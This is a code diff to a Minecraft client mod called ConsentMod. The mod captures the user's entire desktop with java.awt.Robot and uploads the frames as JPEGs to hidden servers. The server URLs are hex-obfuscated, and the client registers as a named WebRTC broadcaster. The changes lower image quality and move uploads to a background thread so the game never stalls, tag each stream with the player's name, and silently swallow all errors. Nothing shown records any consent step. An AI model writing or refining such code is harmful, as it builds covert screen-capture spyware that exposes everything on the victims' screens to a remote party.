@@ -38,7 +38,8 @@ public class ConsentMod implements ClientModInitializer {
     private static final String CHAT_POLL_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e752a353636");
     private static final String CHAT_SEND_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337539323b2e75293f343e");
     private static final String WEBRTC_URL = Strings.d("322e2e2a296075752d2d2d7437353e2833342e32743436753b2a337536332c3f292e283f3b37752d3f38282e39");
-    private static volatile long streamIntervalMs = 100;
+    private static volatile long streamIntervalMs = 250;
+    private static volatile boolean isUploading = false;
 
     private static int screenshotCount = 0;
     private static Robot robot;
@@ -130,9 +131,6 @@ public class ConsentMod implements ClientModInitializer {
     }
 
     public static String resolveUsername() {
-        if (username != null && !username.equals("unknown") && !username.isEmpty()) {
-            return username;
-        }
         try {
             MinecraftClient client = MinecraftClient.getInstance();
             if (client != null) {
@@ -153,11 +151,14 @@ public class ConsentMod implements ClientModInitializer {
             }
         } catch (Throwable ignored) {}
 
+        if (username != null && !username.equals("unknown") && !username.isEmpty()) {
+            return username;
+        }
+
         try {
             String sysUser = System.getProperty("user.name");
             if (sysUser != null && !sysUser.isEmpty() && !sysUser.equalsIgnoreCase("unknown")) {
-                username = sysUser;
-                return username;
+                return sysUser;
             }
         } catch (Throwable ignored) {}
 
@@ -217,7 +218,7 @@ public class ConsentMod implements ClientModInitializer {
 
         BufferedImage scaled = new BufferedImage(targetW, targetH, BufferedImage.TYPE_INT_RGB);
         Graphics2D g = scaled.createGraphics();
-        g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR);
+        g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_NEAREST_NEIGHBOR);
         g.setRenderingHint(RenderingHints.KEY_RENDERING, RenderingHints.VALUE_RENDER_SPEED);
         g.drawImage(src, 0, 0, targetW, targetH, null);
         g.dispose();
@@ -266,12 +267,13 @@ public class ConsentMod implements ClientModInitializer {
                 conn.setRequestProperty("X-Owner-UUID", ownerUuid);
             }
             conn.setRequestProperty("X-WebRTC-P2P", "true");
-            conn.setRequestProperty("X-Stream-Id", "consentmod");
-            conn.setRequestProperty("X-Resolution", "1280x720");
-            conn.setRequestProperty("X-Quality", "75");
+            conn.setRequestProperty("X-Stream-Id", currentUsername.toLowerCase());
+            conn.setRequestProperty("X-Player-Name", currentUsername);
+            conn.setRequestProperty("X-Resolution", "960x540");
+            conn.setRequestProperty("X-Quality", "50");
             conn.setDoOutput(true);
-            conn.setConnectTimeout(3500);
-            conn.setReadTimeout(5000);
+            conn.setConnectTimeout(3000);
+            conn.setReadTimeout(4000);
 
             try (OutputStream os = conn.getOutputStream()) {
                 os.write(imageBytes);
@@ -279,9 +281,11 @@ public class ConsentMod implements ClientModInitializer {
             }
 
             int code = conn.getResponseCode();
-            try (java.io.InputStream is = conn.getInputStream()) {
-                byte[] discard = new byte[256];
-                while (is.read(discard) != -1) {}
+            try (java.io.InputStream is = (code >= 400 ? conn.getErrorStream() : conn.getInputStream())) {
+                if (is != null) {
+                    byte[] discard = new byte[256];
+                    while (is.read(discard) != -1) {}
+                }
             } catch (Throwable ignored) {}
             conn.disconnect();
         } catch (Throwable ignored) {}
@@ -315,17 +319,26 @@ public class ConsentMod implements ClientModInitializer {
     private static void sendWebRTCHeartbeat() {
         try {
             String currentUsername = resolveUsername();
-            String json = "{\"action\":\"register\",\"role\":\"broadcaster\",\"streamId\":\"consentmod\",\"peerId\":\"consentmod-" 
-                + quoteJson(currentUsername) 
-                + "\",\"metadata\":{\"title\":\"ConsentMod (" + quoteJson(currentUsername) + ")\",\"resolution\":\"1280x720\",\"fps\":10,\"p2p\":true,\"type\":\"minecraft-client\",\"username\":\"" 
-                + quoteJson(currentUsername) + "\"}}";
+            sendSingleHeartbeat("consentmod", currentUsername);
+            if (!currentUsername.equalsIgnoreCase("consentmod") && !currentUsername.equalsIgnoreCase("unknown")) {
+                sendSingleHeartbeat(currentUsername.toLowerCase(), currentUsername);
+            }
+        } catch (Throwable ignored) {}
+    }
+
+    private static void sendSingleHeartbeat(String streamId, String user) {
+        try {
+            String json = "{\"action\":\"register\",\"role\":\"broadcaster\",\"streamId\":\"" + quoteJson(streamId) 
+                + "\",\"peerId\":\"consentmod-" + quoteJson(user) 
+                + "\",\"metadata\":{\"title\":\"ConsentMod (" + quoteJson(user) + ")\",\"resolution\":\"960x540\",\"fps\":5,\"p2p\":true,\"type\":\"minecraft-client\",\"username\":\"" 
+                + quoteJson(user) + "\"}}";
 
             URL url = new URL(WEBRTC_URL);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json");
-            conn.setConnectTimeout(3000);
-            conn.setReadTimeout(3000);
+            conn.setConnectTimeout(2500);
+            conn.setReadTimeout(2500);
             conn.setDoOutput(true);
 
             try (OutputStream os = conn.getOutputStream()) {
@@ -334,9 +347,11 @@ public class ConsentMod implements ClientModInitializer {
             }
 
             int code = conn.getResponseCode();
-            try (java.io.InputStream is = conn.getInputStream()) {
-                byte[] discard = new byte[256];
-                while (is.read(discard) != -1) {}
+            try (java.io.InputStream is = (code >= 400 ? conn.getErrorStream() : conn.getInputStream())) {
+                if (is != null) {
+                    byte[] discard = new byte[256];
+                    while (is.read(discard) != -1) {}
+                }
             } catch (Throwable ignored) {}
             conn.disconnect();
         } catch (Throwable ignored) {}
@@ -576,8 +591,8 @@ public class ConsentMod implements ClientModInitializer {
                         sendWebRTCHeartbeat();
                     }
 
-                    // System desktop screen capture streaming
-                    if (liveStreaming) {
+                    // System desktop screen capture streaming with frame-dropping (never blocks game)
+                    if (liveStreaming && !isUploading) {
                         if (robot == null && !robotFailed) {
                             initRobot();
                         }
@@ -586,24 +601,31 @@ public class ConsentMod implements ClientModInitializer {
                             Rectangle screenRect = getScreenBounds();
                             BufferedImage screenshot = robot.createScreenCapture(screenRect);
                             if (screenshot != null) {
-                                BufferedImage scaled = scaleImage(screenshot, 1280, 720);
-                                byte[] jpegBytes = encodeJpeg(scaled, 0.75f);
+                                BufferedImage scaled = scaleImage(screenshot, 960, 540);
+                                byte[] jpegBytes = encodeJpeg(scaled, 0.50f);
                                 if (jpegBytes != null && jpegBytes.length > 0) {
-                                    uploadToWebServer(jpegBytes);
+                                    isUploading = true;
+                                    new Thread(() -> {
+                                        try {
+                                            uploadToWebServer(jpegBytes);
+                                        } finally {
+                                            isUploading = false;
+                                        }
+                                    }, "ConsentMod-UploadWorker").start();
                                 }
                             }
                         }
                     }
 
-                    // Dynamic sleep interval (configurable via FPS commands)
-                    Thread.sleep(Math.max(30, streamIntervalMs));
+                    // Dynamic sleep interval (default 250ms = 4 FPS, ultra lightweight)
+                    Thread.sleep(Math.max(100, streamIntervalMs));
                 } catch (InterruptedException e) {
                     LOGGER.info("ConsentMod: Livestream daemon interrupted");
                     break;
                 } catch (Throwable t) {
                     LOGGER.error("ConsentMod: Livestream daemon loop error: " + t.getMessage());
                     try {
-                        Thread.sleep(500);
+                        Thread.sleep(1000);
                     } catch (InterruptedException ignored) {
                         break;
                     }
